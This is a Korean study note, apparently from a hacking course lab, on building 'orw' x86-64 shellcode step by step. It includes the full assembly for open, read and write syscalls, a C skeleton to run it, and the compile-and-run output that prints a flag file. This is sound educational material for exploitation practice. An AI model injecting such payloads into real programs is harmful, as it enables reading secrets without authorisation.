# 셸코드란?
 익스플로잇을 위해 제작된 어셈블리 코드 조각이다.       // 익스플로잇이란?) 상대 시스템을 공격하는 행위이다.
 셸코드의 목적은 셸을 획득하기 위함이다.

# orw 셸코드
 셸코드를 작성하면 특정 파일을 열어볼 수 있다.
 다양한 셸코드 중 orw셸코드라는 게 있다. 이름에서 알 수 있듯이 open, read, write 하며 파일을 열고, 읽고, 화면에 출력해주는 셸코드이다


 # 셸코드 구현
   1) int fd = open("/tmp/flag", O_RDONLY, NULL)
      -우선 "/tmp/flag" 라는 문자열을 메모리에 위치 시켜야 한다.
        왜?) 시스템 호출에서 파일 경로를 가리키는 주소가 필요하다. 운영체제는 파일을 열 때 문자열로 된 경로를 입력받아 파일을 찾기 때문에 문자열이 메모리에 존재해야 시스템 호출이 참조할 수 있다.
      
      - 해당 문자열을 16진수로 바꾸고 리틀 엔디안 형태로 바꾸면 다음과 같다.  0x67616c662f706d742f 
         > 여기서 16진수로 바꾸는 이유는 컴퓨터가 이해할 수 있도록 컴퓨터 언어로 바꾼다고 보면 된다.
         > 리틀 엔디안 형태는 바이트 형태를 나타내는 방식으로, 숫자나 데이터를 메모리에 저장할 때 가장 낮은 바이트를 먼저 저장하는 방식이다. 자세한 내용은 추후에 알아보자. 
      - 이제 변환한 16진수를 스택에 넣어야 한다.
         > 이때, 스택은 8바이트 단위로만 값을 push할 수 있기 때문에 맨 앞 1바이트인 0x67를 먼저 push하고 나머지 데이터를 push한다.    (스택은 8바이트 단위로만 값을 push 할 수 있다)

      - rdi 값 정하기
         > 이후 rdi가 이를 가리키도록 rsp를 rdi로 옮긴다. 여기서 rsp란 Stack Pointer로, 스택 포인터를 나타내는 레지스터이다. 스택 포인터는 프로그램의 스택 영역에서 현재 위치를 가리키는 역할을 한다. 즉, rsp는 항상 스택의 최상단 주소를 가리킨다.
         > 왜 이 과정을 거칠까?)  rdi 에는 파일경로의 메모리 주소를 넣어야 한다. 즉, rdi에는 파일 경로 문자열이 저장된 메모리의 시작 주소가 담겨져 있다.

      - rsi 값 정하기
         > 셸코드에서 open시스템 콜을 호출하는 이유는 특정 파일(/tmp/flag)을 열어 그 내용을 읽기 위해서 이다. 그래서 우리는 읽기 전용 모드로 열어야 한다.
         > rsi에는 값 0을 담는다. rsi는 open 시스템 콜의 두 번째 인자로, 파일을 여는 모드를 지정하는 곳이다. 읽기 전용 모드는 O_RDONLY로 정의되며, 이 값은 0이다. 쓰기 전용, 읽기/쓰기에 해당되는 값은 아래에 정리해두었다.

      - rdx값 정하기
         > rdx는 open 시스템 콜의 세 번째 인자로, 파일의 모드(umode_t)를 지정하는 곳이다. 하지만 읽기 전용, 쓰기 전용 모드 등에는 일반적인 경우에 모드를 지정할 필요가 없기 때문에 rdx는 0으로 설정된다.
         > 파일을 생성하거나 권한을 설정해야 하는 경우에는 rdx가 특정 값으로 설정된다. 예를 들어, 0_CREAT 모드에는 rdx값을 0644로 설정한다.
         
      - rax값 정하기
         > rax는 시스템 호출과 관련된 작업에서 시스템 콜 번호를 저장하는 데 사용된다. 또한 시스템 콜의 결과 값을 반환하는 데도 사용된다.(이 부분은 2번째 단계에서 다시 언급하겠다.)
         > 각 시스템 호출에는 번호가 정해져 있다. open 시스템 호출은 2번이다. 다른 시스템 호출 번호는 아래에 정리해 두겠다.
         > 지금은 open 시스템 호출 과정이니 rax에 값 2를 설정한다.

      - open 과정을 어셈블리어로 구현하면 다음과 같다.
         
~~~
push 0x67
mov rax, 0x616c662f706d742f 
push rax
mov rdi, rsp    ; rdi = "/tmp/flag"
xor rsi, rsi    ; rsi = 0 ; RD_ONLY
xor rdx, rdx    ; rdx = 0
mov rax, 2      ; rax = 2 ; syscall_open
syscall         ; open("/tmp/flag", RD_ONLY, NULL)
~~~

   - 여기서 xor 명령어는 주로 레지스터 값을 0으로 초기화하는 데 사용된다.

  - 8번 줄에 syscall을 입력하면 open함수가 작동된다. 운영체제가 지정한 파일을 열고, 그 파일에 접근할 수 있는 파일 디스크립터 (FD)를 반환한다.

  - 지금까지 과정이 orw셸코드의 open부분을 작성한 것이다.


  2) read(fd, buf, 0x30)
   
       - open함수에서 획득한 /tmp/flag의 fd는 rax에 저장된다.
          >  아까 언급했듯이 rax에는 시스템 콜 번호를 저장할 뿐만 아니라, 시스템 콜의 결과 값을 반환하기도 한다.
          
       - rdi 값
          > rax에 저장된 fd값은 fdi에 대입된다. 이떄, unsigned int fd는 "부호없는 정수형"이라는 의미이다. fd 값은 음수가 아니기 때문에 이렇게 사용한다.

      - rsi 값  (어디에 놓을지?)
        > rsi는 파일에서 읽은 데이터를 저장할 주소를 가리킨다.
        > buf라는 변수는 파일에서 읽어온 데이터를 임시로 저장하는 역할을 한다. 이후 rsi는 buf의 메모리 주소를 참조한다. (이 값은 48바이트의 데이터이다.)
        > 0x30만큼 읽을 것이기에 rsi 에 rsp-0x30을 대입한다.
          ->rsp는 스택의 최상단 주소를 가리킨다. 이제 우리는 파일에서 읽어온 48바이트 크기의 데이터를 저장할 공간이 필요하다. rsp - 0x30은 스택의 최상단에서 0x30(48 바이트) 아래에 위치한 메모리 주소를 나타낸다. 따라서, 이 위치를 버퍼로 사용하여 데이터를 안전하게 저장할 수 있다.
        > 여기서 주의할 점은 데이터는 읽는 과정에서 이동하는 것이 아니라, 파일로부터 메모리의 특정 위치로 복사되는 개념이다.

      - rdx값  (얼마나 뽑을지?)
        > rdx에서는 파일로부터 읽어낼 데이터의 길이를 설정한다. 여기서 0x30라는 값으로 설정.
        
      - rax값
        > 시스템 콜 번호를 저장해야 한다. read 시스템 호출의 번호는 0이기 떄문에 rax를 0으로 설정한다.


      - 여기까지 정리하자면,rdi는 운영 체제가 파일을 식별하고 프로그램이 파일에 접근할 수 있도록 하는 파일 디스크립터 값을 가진다. rsi는 읽어온 데이터를 저장할 메모리 주소를 가리키며, rdx는 읽어올 데이터의 크기를 결정한다.
   
      - read 과정을 어셈블리로 구현하면 다음과 같다.
~~~
mov rdi, rax      ; rdi = fd
mov rsi, rsp
sub rsi, 0x30     ; rsi = rsp-0x30 ; buf
mov rdx, 0x30     ; rdx = 0x30     ; len
mov rax, 0x0      ; rax = 0        ; syscall_read
syscall           ; read(fd, buf, 0x30)
~~~

   3) write(1, buf, 0x30)
 
       - write는 가져온 데이터를 화면에 출력하는 단계이다. 시작하기 전에 read까지 끝난 상태를 확인해보자. read 시스템 호출을 통해 파일에서 읽은 데이터가 buf(즉, rsi가 가리키는 메모리 위치 - 아까 비워놨던 곳)에 저장된 상태이다. 이제 이 데이터를 출력(화면)으로 보내야 한다.
       - rdi 값
         > rdi를 1로 설정한다. 왜 그럴까?) 표준 출력을 의미하는 fd값이 1이기 때문이다.

       - rsi, rdx 값
         > read와 동일하다. 왜 그럴까?) 버퍼에 저장된 값과 출력할 데이터의 바이트 수는 같아야 하기 때문이다.
         
       - rax 값
         > write 시스템 호출 번호는 1이다. rax를 1로 설정하여 화면에 출력하자.
         
       - write 과정을 어셈블리로 구현하면 다음과 같다.
~~~
mov rdi, 1        ; rdi = 1 ; fd = stdout
mov rax, 0x1      ; rax = 1 ; syscall_write
syscall           ; write(fd, buf, 0x30)
~~~

 # 완성된 orw셸코드
 ~~~
;Name: orw.S

push 0x67
mov rax, 0x616c662f706d742f 
push rax
mov rdi, rsp    ; rdi = "/tmp/flag"
xor rsi, rsi    ; rsi = 0 ; RD_ONLY
xor rdx, rdx    ; rdx = 0
mov rax, 2      ; rax = 2 ; syscall_open
syscall         ; open("/tmp/flag", RD_ONLY, NULL)

mov rdi, rax      ; rdi = fd
mov rsi, rsp
sub rsi, 0x30     ; rsi = rsp-0x30 ; buf
mov rdx, 0x30     ; rdx = 0x30     ; len
mov rax, 0x0      ; rax = 0        ; syscall_read
syscall           ; read(fd, buf, 0x30)

mov rdi, 1        ; rdi = 1 ; fd = stdout
mov rax, 0x1      ; rax = 1 ; syscall_write
syscall           ; write(fd, buf, 0x30)
~~~

# 셸코드 사용해보기

  - 우리가 만든 셸코드인 orw.s 파일은 아스키로 작성된 어셈블리 코드이다. 이를 기계어로 치환하면 CPU가 이해할 수는 있으나, ELF형식이 아니므로 리눅스에서 실행될 수 없다.

  - ELF란 리눅스에서 사용되는 표준 실행 파일이다. 일단 해킹을 배울 떄 리눅스 환경을 선호한다. (자세한 이유는 나중에 더 공부해보자.) orw.s파일을 ELF형식으로 바꾸기 위해서는 gcc 컴파일러를 통해 어셈블리 코드를 기계어로 변환하고, 이를 ELF형식의 실행 파일로 만들어줘야 한다.


  1) 스켈레톤 코드 + 셸코드
~~~
// File name: sh-skeleton.c
// Compile Option: gcc -o sh-skeleton sh-skeleton.c -masm=intel

__asm__(
    ".global run_sh\n"
    "run_sh:\n"

    "Input your shellcode here.\n"
    "Each line of your shellcode should be\n"
    "seperated by '\n'\n"

    "xor rdi, rdi   # rdi = 0\n"
    "mov rax, 0x3c	# rax = sys_exit\n"
    "syscall        # exit(0)");

void run_sh();

int main() { run_sh(); }
~~~
   
  - 스켈레톤 코드란?) 프로그램의 기본적인 구조만 포함된 코드이다. 즉, 뼈대만 있는 코드이다.

  - 이제 orw.s 파일은 orw.c 파일로 바뀐다. 여기서 알아야 할 점은 "리눅스에서 읽을 수 있도록 셸코드를 C언어에 이식하는 과정"을 거친다는 점이다. 이제 gcc(C언어 컴파일러)를 이용해 orw.c를 컴파일하면 ELF파일이 생성된다.


 2) 우분투 실행 후 파일을 만들어 문자열 넣기
  - echo 'flag{this_is_open_read_write_shellcode!}' > /tmp/flag
    > 명령어 의미 : /tmp/flag라는 파일을 만들고 "this_is_opne_read_write_shellcode!"라는 문자열을 넣는 코드이다. 우리는 이제 이 문자열을 orw셸코드를 이용해 가져올 것이다.

 3) orw.c을 컴파일하고 실행한다.
  - 우선 orw.c 파일을 컴파일 하려면 우분투에서 해당 디렉토리로 이동해야 한다.
~~~
cd /mnt/c/dreamhackpractice/
~~~
  - cd 명령어로 orw파일의 위치를 찾는다.

~~~
/mnt/c/dreamhackpractice/# gcc -o orw orw.c -masm=intel
~~~
  - gcc -o orw orw.c -masm=intel 코드를 입력해 컴파일한다.
  - o orw 는 실행 파일을 생성하는 코드이다. orw라는 실행 파일을 생성한다.
  - orw.c 는 컴파일할 소스 코드 파일이다.

~~~
/mnt/c/dreamhackpractice# ./orw
~~~
  - ./orw 명령어를 입력하면 셸코드가 실행된다.
  - .의미 : 현재 디렉토리
  - orw 의미 : 실행할 파일의 이름
  - 해석하자면 "orw.c에 작성된 셸코드가 실행되어 /tmp/flag 파일을 열고 그 내용을 읽어 출력한다."이다.

​
4) 결과
~~~
cd /mnt/c/dreamhackpractice/
/mnt/c/dreamhackpractice/# gcc -o orw orw.c -masm=intel
/mnt/c/dreamhackpractice# ./orw
flag{this_is_open_read_write_shellcode!}
~~~
  - 마지막 줄을 보면 아까 파일에 입력한 문자열이 출력된 것을 볼 수 있다.



# 파일 디스크립터 (fd) 값

  0 : 표준입력

  1 : 표준출력

  2 : 표준에러

​

  - fd는 운영 체제가 파일을 관리하고 프로그램이 파일에 접근할 수 있도록 하는 고유 식별자이다. 파일 디스크값은 정수 값으로, 파일이나 입출력 장치와 같은 리소스에 접근하는 데 사용된다.

 

​

​

# syscall에서 인자들

  - rax, rdi, rsi, rdx 는 x86-64 아키텍처에서 사용되는 64비트 레지스터이다. (범용 

​

​

​

# 리눅스에서 사용되는 일반적인 파일 열기 플래그와 그 값들

  1) O_RDONLY  : 읽기 전용 

      값: 0x0

  

  2) O_WRONLY : 쓰기 전용

      값: 0x1

​

  3) O_RDW : 읽기 / 쓰기

      값: 0x2

  등등

​

​

# 시스템 호출 번호

  1) open  : 2

  2) write : 1

  3) read : 0

  4) close : 3

  5) exit : 60

    등등
